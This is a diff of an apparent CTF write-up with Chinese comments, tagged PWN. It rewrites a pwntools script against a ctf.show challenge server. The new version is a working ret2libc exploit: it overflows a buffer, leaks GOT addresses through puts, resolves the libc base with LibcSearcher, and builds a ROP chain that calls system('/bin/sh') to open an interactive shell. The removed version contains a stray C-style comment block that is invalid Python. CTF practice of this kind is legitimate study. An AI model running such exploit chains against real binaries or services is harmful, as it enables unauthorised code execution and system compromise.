@@ -15,86 +15,70 @@ tags: [PWN]
 
 ```
 from pwn import *
-from LibcSearcher import *
-import os
+from LibcSearcher import LibcSearcher
 
 context(os='linux', arch='amd64', log_level='debug')
 
+# 替换为你的题目地址
 sh = remote('pwn.challenge.ctf.show', 28202)
 elf = ELF('./pwn')
 rop = ROP(elf)
 
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-offset = 20
+main_addr = elf.sym['main']
+puts_plt = elf.plt['puts']
+offset = 0x78
 
-# 这里定义要泄露的函数，不只是 puts
-LEAK_FUNCS = ['puts', 'gets', 'setvbuf', '__libc_start_main']
-
-def leak_func(sym):
-    # 每次泄露一个函数地址：puts(got[sym])
-    payload  = b'a' * offset
+def get_addr(func_name):
+    payload = b'a' * offset
     payload += p64(pop_rdi)
-    payload += p64(elf.got[sym])      # 关键：换不同 sym 就泄露不同函数
-    payload += p64(elf.plt['puts'])   # 用 puts 打印 got[sym] 里的真实地址
-    payload += p64(elf.sym['welcome'])# 回到 welcome，方便下一次继续泄露
-    sh.sendline(payload)
+    payload += p64(elf.got[func_name])
+    payload += p64(puts_plt)
+    payload += p64(main_addr)
+    
+    sh.sendlineafter(b'!', payload)
+    
+    # 关键点：puts 输出的是二进制流，末尾带 \n
+    # 我们只接收前 6 字节，因为 64 位地址高位通常是 00
+    addr = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+    return addr
 
-    /*
-    sh.recvline(timeout=2)            # 吃掉 echo 行
-    data = sh.recvn(6, timeout=2)     # 读到泄露地址（低6字节）
-    sh.recvline(timeout=2)            # 吃掉换行
-    return u64(data.ljust(8, b'\x00'))
-	*/
-	
-def parse_symbols(path):
-    d = {}
-    with open(path, 'r', errors='ignore') as f:
-        for line in f:
-            line = line.strip()
-            if not line or ' ' not in line:
-                continue
-            k, v = line.split(' ', 1)
-            try:
-                d[k] = int(v.strip(), 16)
-            except ValueError:
-                pass
-    return d
+# 1. 泄露多个地址以增加匹配精度
+puts_addr = get_addr('puts')
+log.success(f'Puts real addr: {hex(puts_addr)}')
 
-def find_unique_libc(leaks):
-    lib = LibcSearcher('puts', leaks['puts'])
-    db = lib.libc_database_path
-    need = LEAK_FUNCS + ['system', 'str_bin_sh']
-    candidates = []
+# 此时程序回到了 main，再次触发泄露
+libc_start_main = get_addr('__libc_start_main')
+log.success(f'Libc_start_main real addr: {hex(libc_start_main)}')
 
-    for fn in os.listdir(db):
-        if not fn.endswith('.symbols'):
-            continue
-        syms = parse_symbols(db + fn)
-        if not all(k in syms for k in need):
-            continue
+# 2. 使用 LibcSearcher 进行匹配
+# 传入多个条件可以极大地缩小范围
+libc = LibcSearcher('puts', puts_addr)
+libc.add_condition('__libc_start_main', libc_start_main)
 
-        base = leaks['puts'] - syms['puts']
-        # 关键：用 gets/setvbuf/__libc_start_main 的完整地址继续筛
-        if all(base + syms[s] == leaks[s] for s in LEAK_FUNCS[1:]):
-            candidates.append(fn)
+# 如果匹配到多个，它会提示你选；如果没匹配到，会报错
+try:
+    libc_base = puts_addr - libc.dump('puts')
+    system_addr = libc_base + libc.dump('system')
+    bin_sh_addr = libc_base + libc.dump('str_bin_sh')
+    
+    log.success(f'Libc Base: {hex(libc_base)}')
+    log.success(f'System: {hex(system_addr)}')
+    
+    # 3. 最终 Payload (注意 64 位 system 栈对齐)
+    ret = rop.find_gadget(['ret'])[0]
+    payload = b'a' * offset
+    payload += p64(ret) # stack alignment
+    payload += p64(pop_rdi)
+    payload += p64(bin_sh_addr)
+    payload += p64(system_addr)
+    
+    sh.sendlineafter(b'!', payload)
+    sh.interactive()
 
-    candidates = list(dict.fromkeys(candidates))
-    if len(candidates) != 1:
-        raise RuntimeError(f'Not unique: {len(candidates)} -> {candidates[:10]}')
-
-    return candidates[0]
-
-# 关键：这里会循环泄露 4 个函数地址
-leaks = {}
-for s in LEAK_FUNCS:
-    leaks[s] = leak_func(s)
-    log.success(f'leak {s} = {hex(leaks[s])}')
-
-libc_name = find_unique_libc(leaks)
-print('[+] UNIQUE libc:', libc_name)
-
-sh.close()
-
+except Exception as e:
+    print(f"[-] Libc matching failed: {e}")
+    print("请检查泄露地址是否正确，或者尝试更新 LibcSearcher 数据库")
 ```
 
 ## 注意：
